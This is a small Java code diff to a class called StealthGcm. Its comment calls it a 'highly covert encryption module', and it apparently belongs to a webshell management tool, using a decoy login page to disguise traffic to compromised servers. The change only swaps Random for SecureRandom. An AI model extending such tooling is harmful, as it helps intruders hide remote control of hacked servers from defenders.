@@ -12,7 +12,6 @@ import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 import java.security.SecureRandom;
 import java.util.Base64;
-import java.util.Random;
 
 /**
  * 高度隐蔽的加密模块
@@ -55,7 +54,7 @@ public class StealthGcm implements Cryption {
       "<!DOCTYPE html><html><head><title>Login</title></head><body><form>Username:<input type='text'/><br/>Password:<input type='password'/></form></body></html>"
    };
    
-   private Random random;
+   private SecureRandom random;
    private String currentParamName;
 
    public void init(ShellEntity context) {
